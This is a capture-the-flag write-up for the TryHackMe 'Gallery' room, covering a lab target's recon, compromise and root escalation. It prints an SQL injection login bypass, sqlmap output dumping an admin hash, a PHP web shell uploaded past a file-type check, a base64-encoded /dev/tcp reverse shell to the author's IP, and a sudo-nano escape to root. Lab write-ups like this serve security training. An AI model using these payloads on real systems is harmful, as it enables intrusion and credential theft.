Starting off with a Nmap Scan:

```bash

┌──(kali㉿kali)-[~/CTFs/TryHackmeCTFs/Gallery]
└─$ nmap -sV -sC -o nmap.scan -p- -T4 10.10.211.225    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 15:33 EST
Nmap scan report for 10.10.211.225
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Simple Image Gallery System

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.48 seconds

```

-sV for service detection
-sC for the default script
-o to output it to a file
-p- to scan all ports
-T4 to speed up the process of the scan

1. How many ports are open?
	2

So there are two http ports open. The 80 one is just the Apache2 default page and the 8080 redirects us to /gallery/login.php. Running some Directory scanning in the background we get this

```bash

┌──(kali㉿kali)-[~/CTFs/TryHackmeCTFs/Gallery]
└─$ gobuster dir -u http://10.10.211.225 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.211.225
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/03/10 15:34:25 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/gallery              (Status: 301) [Size: 316] [--> http://10.10.211.225/gallery/]
Progress: 55145 / 350660 (15.73%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/03/10 15:40:45 Finished
===============================================================
```

And this for port 8080

```bash

┌──(kali㉿kali)-[~/CTFs/TryHackmeCTFs/Gallery]
└─$ gobuster dir -u http://10.10.211.225:8080 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt --exclude-length 15916
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.211.225:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] Exclude Length:          15916
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/03/10 15:40:10 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/home                 (Status: 200) [Size: 16950]
/home.php             (Status: 500) [Size: 0]
/index.php            (Status: 200) [Size: 16950]
/archives             (Status: 301) [Size: 324] [--> http://10.10.211.225:8080/archives/]
/login.php            (Status: 200) [Size: 8047]
/login                (Status: 200) [Size: 19571]
/index                (Status: 200) [Size: 148035437]
/user                 (Status: 301) [Size: 320] [--> http://10.10.211.225:8080/user/]
/uploads              (Status: 301) [Size: 323] [--> http://10.10.211.225:8080/uploads/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.211.225:8080/assets/]
/report               (Status: 301) [Size: 322] [--> http://10.10.211.225:8080/report/]
/wp-login.php         (Status: 200) [Size: 15843]
/albums               (Status: 301) [Size: 322] [--> http://10.10.211.225:8080/albums/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.211.225:8080/plugins/]
/database             (Status: 301) [Size: 324] [--> http://10.10.211.225:8080/database/]
/classes              (Status: 301) [Size: 323] [--> http://10.10.211.225:8080/classes/]
/config.php           (Status: 200) [Size: 0]
/config               (Status: 200) [Size: 7545]
/dist                 (Status: 301) [Size: 320] [--> http://10.10.211.225:8080/dist/]
/404.html             (Status: 200) [Size: 198]
/inc                  (Status: 301) [Size: 319] [--> http://10.10.211.225:8080/inc/]
/build                (Status: 301) [Size: 321] [--> http://10.10.211.225:8080/build/]
Progress: 16709 / 350660 (4.77%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/03/10 15:42:21 Finished
===============================================================

```

Theres a lot more going on Port 8080. Allthough checking all the directories I couldnt find anything useful.

Looking at the login page, I tried to use some common credentials but none of them where valid. After a bit of trial and error, I tested the username field for SQLi and used the most common payload:

```sql
'OR 1=1;-- -
```

we're in!

Firs thing we see is this "Simple Image Gallery System".

2. What's the name of the CMS?
	Simple Image Gallery

Heading over to the User (clicking on the Profile Picture) I found out that we can inject js code (XSS). I DO NOT RECOMMEND IT !!!! I completely destroyed the web page by accident adding that xss... :(
after a minute or so i restarted the machine and got back into it. now i wanted to focus more on the SQLi since we saw it is vulnerable to it.

Intercepting the request with burp and changing the username to * so sqlmap knows i want to target the username field.

![[Gallery_BurpRequest.png]]

After saving the request to a file i ran it with sqlmap to see if it can find something.

```bash

┌──(kali㉿kali)-[~/CTFs/TryHackmeCTFs/Gallery]
└─$ sqlmap -r sql.txt --dbs --batch                                
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:09:56 /2023-03-10/

[16:09:56] [INFO] parsing HTTP request from 'sql.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[16:09:56] [INFO] testing connection to the target URL
[16:09:56] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:09:56] [INFO] testing if the target URL content is stable
[16:09:57] [INFO] target URL content is stable
[16:09:57] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[16:09:57] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
...

[16:10:11] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:10:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:10:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:10:13] [INFO] target URL appears to be UNION injectable with 10 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[16:10:20] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[16:10:20] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 160 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 9716 FROM (SELECT(SLEEP(5)))GBpJ) AND 'WeMq'='WeMq&password=helloworld
---
[16:10:36] [INFO] the back-end DBMS is MySQL
[16:10:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[16:10:41] [INFO] fetching database names
[16:10:41] [INFO] fetching number of databases
[16:10:41] [INFO] retrieved: 
[16:10:51] [INFO] adjusting time delay to 1 second due to good response times
2
[16:10:52] [INFO] retrieved: gallery_db
[16:11:32] [INFO] retrieved: information_schema
available databases [2]:
[*] gallery_db
[*] information_schema

[16:12:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.41.122'

[*] ending @ 16:12:42 /2023-03-10/

```

This took a while since it was doing a time based SQLi. Turns out there are 2 Databases: gallery_db and informations_schema.

Curious what's in gallery_db

while running sqlmap over and over again i tried to upload a php file with a RCE code in it.

```php

<?php system($_GET['cmd'])?>

```

![[UploadFile 1.png]]

First we need to change the request and remove the PNG extension in Burp

![[BurpUpload.png]]
Success! Now we just need to find out where the file has been stored. After a bit of searching I noticed you can download the "image" you uploaded by clicking on the 3 dots on the image. Hovering over the download option exposed the path, where our file got stored.
![[RCE.png]]

from here on, its pretty obvious what we're gonna do. (Reverse Shell)

Encoding the command into Base64 and piping it over to bash 

```bash

http://10.10.41.122/gallery/uploads/user_1/album_2/1678483200.php?cmd=echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTEuOS4yNDgvNDQ0NCAwPiYx | base64 -d | bash

```

Meanwhile on my machine

```bash

┌──(kali㉿kali)-[~/CTFs/TryHackmeCTFs/Gallery]
└─$ nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.41.122.
Ncat: Connection from 10.10.41.122:35900.
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gallery:/var/www/html/gallery/uploads/user_1/album_2$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gallery:/var/www/html/gallery/uploads/user_1/album_2$ 

```

So far so good, we got a shell.  there's really nothing all that interesting or usefull in this /var/www/html/gallery path. Kinda gave up on manual enummeration and moved linpeas.sh to the box.

```bash

╔══════════╣ Searching passwords in history files
      @stats   = stats
      @items   = { _seq_: 1  }
      @threads = { _seq_: "A" }
sudo -l <REDACTED>
sudo -l

```

3. FInally something new. If we try this password with mike it works. Lets grab our user.txt flag.

```bash
www-data@gallery:/var/www/html/gallery/uploads/user_1/album_2$ su mike
Password: 
mike@gallery:/var/www/html/gallery/uploads/user_1/album_2$ 
mike@gallery:/var/www/html/gallery/uploads/user_1/album_2$ cd 
mike@gallery:~$ cat user.txt 
THM{<REDACTED>}
```

Meanwhile sqlmap finally finished bruteforcing the tables and columns

```bash

┌──(kali㉿kali)-[~/CTFs/TryHackmeCTFs/Gallery]
└─$ sqlmap -r sql.txt -D gallery_db -T users -C username,password --dump        
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.11#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:55:13 /2023-03-10/

---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 9716 FROM (SELECT(SLEEP(5)))GBpJ) AND 'WeMq'='WeMq&password=helloworld
---
Database: gallery_db
Table: users
[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | a228b12a08b6527e7978cbe5d914531c |
+----------+----------------------------------+

```

4. There goes question number 2
	a228b12a08b6527e7978cbe5d914531c

Only task left is to get the root flag. Running sudo -l we can see we can execute rootkit.sh as root without password

```bash
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

Seeing whats inside rootkit.sh

```bash
mike@gallery:~$ cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

since we can exexute the script as root, we should also be able to execute commands inside nano as root.

First type ```read``` as shown 

```bash
mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read
```

Inside nano type Ctrl + R and Ctrl + X to open up the command line then type this command:
```bash
reset; sh 1>&0 2>&0
```

This should get you the root shell. From there on read the Root file and the room is done.

```bash
# bash
root@gallery:~# id
uid=0(root) gid=0(root) groups=0(root)
root@gallery:~# cat /root/root.txt 
THM{<REDACTED>}

```